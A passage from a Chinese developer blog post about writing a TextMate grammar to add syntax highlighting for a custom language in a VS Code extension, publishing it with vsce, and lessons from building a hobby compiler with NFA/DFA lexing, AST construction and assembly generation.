class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;patterns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;support.type.primitive.mc&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;match&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;\\b(void|int|bool)\\b&quot;</span> <span class="hljs-comment">// 类型</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;keywords&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;patterns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;keyword.control.mc&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;match&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;\\b(if|while|for|return|else)\\b&quot;</span> <span class="hljs-comment">// 关键字</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;number&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;patterns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;constant.numeric.mc&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;match&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;\\b[0-9]+\\b&quot;</span> <br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;patterns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;id.name.mc&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;match&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;\\b[a-z][a-z0-9]*\\b&quot;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;comment&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;patterns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;comment.line.double-dash&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;match&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^//.*&quot;</span> <span class="hljs-comment">//注释</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;scopeName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;source.mc&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure></p><p>踩坑点：</p><ol type="1"><li><p>因为是根据分词 token那一套来的，其实也就是对你的语言的文件后缀名，比如我这里是 mc后缀，会做一个词法分析，词法分析的正则是自己编写的，然后每个正则也有对应的name，vscode 在配置(setting.json 文件)里可以根据这些 name做颜色的映射。所以一定要记得简单的正则要在两边加\b\b，表示单词分界，我一开始没加这个总是不生效</p></li><li><p>关于 name的命名，其实有一套规范的标准，当然也可以随心自定义，我这里的？？？就是自定义的。</p></li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> <span class="hljs-built_in">cd</span> myExtension<br><span class="hljs-variable">$</span> vsce package<br><span class="hljs-comment"># 生成 myExtension.vsix,这时候本地可以看到一些二进制插件文件</span><br><span class="hljs-variable">$</span> vsce publish<br><br></code></pre></td></tr></table></figure><p>如果以前没有 vscode 插件市场的账户需要注册https://code.visualstudio.com/api/working-with-extensions/publishing-extension注册完之后，记得本地保存下密钥，因为会经常用的</p><p>取消发布的插件： vsce unpublish -p 密钥 包 id 包 id 可以在 vscode的对应插件的信息里可以看到，(一般点击插件的设置图标就可以看到包 id选项)</p><p>TextMate 语法最好对正则比较熟悉 具体的详细资料：https://code.visualstudio.com/api/language-extensions/semantic-highlight-guide#semantic-token-scope-map</p><p>https://macromates.com/manual/en/language_grammars#naming-conventions（TextMate语法规则）https://macromates.com/manual/en/regular_expressions（相关正则）</p><h2 id="九前端可视化">九、前端可视化</h2><p>canvas</p><p>项目踩坑点：</p><ol type="1"><li>我本地全局和项目下都是安装了 ts-nodede1，但是通过 npm runts-node，就是起不起来：Cannot find module'typescript'，后来在https://github.com/TypeStrong/ts-node/issues/707，好像是版本的问题，找到了最好的解决方案：npmlink typescript，再运行即可</li></ol><p>项目难点：其实整个项目是在学习斯坦福编译原理的时候有顺便一起写的，写下来也挺累的，因为已经在工作了，在编写本项目前，也看了下斯坦福的cool 源码，然后了解了下 bison 和flex，顺便对照了了下虎书的伪代码，下面总结下一些比较重要或者困难的点：</p><ol type="1"><li><p>正则表达式部分，这一部分纯粹自己手写，代码设计可能看着有点邋遢，主要思想是借鉴虎书上的，虎书只画了几个图，也没有给伪代码，主要是怎么设计nfa的节点相关数据结构存储，一个是是用简单的链表，后面发现可能存在出度为多个的节点，就换用邻接表存储了，每个节点的信息包含了所有入度边的信息；其次正则表达式分析这里用的也是stack 对正则表达式进行分析，栈内的元素可能是节点也可能是字符串，在每次pop的时候需要注意对当前出栈的节点进行遍历拿到头尾节点，方便节点之间的连接。然后是将各个nfa 联合成一个大 nfa 的过程，采用 dfa + bfa + 备忘录 + 回溯；最好是将nfa =&gt; dfa 的过程，这一部分参照伪代码的，应该没啥大问题；</p></li><li><p>ast 生成部分：这一步文法分析表生成是参照伪代码的，后面的 ast生成过程是纯手写，其实在实现的过程中，也发现整个过程和 bison 的 yy文件如出一辙，不知道 bison 是怎么实现的 😯，本来是想弄成简单的 bison文件编写文法规则的，但是时间不允许，后面再抽空看下。ast生成这一部分主要是在规约动作上放置一些用户定义动作，这里就是写死的生成对应文法表达式的类，自底向上构建ast</p></li><li><p>这比一部分理论其实挺多的，但是在本项目里只要考虑周到即可，防止在编译的最好阶段报错，也是纯手写的</p></li><li><p>汇编生成部分：这一部分个人觉得最恶心了，因为汇编比较难调试，每次有bug都需要汇编语句一句一句看，其实回过头看，这样把元表达式（像+-<em>/赋值语句）的寄存器分配设计写好了，就可以拿它们组合成更大的原件。这里也是纯手写的，有一个比较困扰我的点，像if-else里面声明的变量如何在运行时候分配内存？我们都知道局部变量在不考虑用寄存器优化的情况下，一般都是存储在栈内的，像参数都是基于fp(栈指针)进行寻址的，比如形式参数 x,y，在生成汇编的时候就要记录，这里我拿数组的[x, y]，这样 x 的偏移量就是fp + 1 </em> 4, y 就是 fp + 2 * 4，但是像 if else里面的声明的变量只有运行到对应的分支才能分配内存，也就是说另一个没有执行的分支是不需要分配内存的。</p></li><li><p>前端部分：用的是原生 canvas，主要是平时工作很少用canvas，之前学过，不用就忘，顺便学习下，主要是整个 canvas类的设计吧。</p></li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
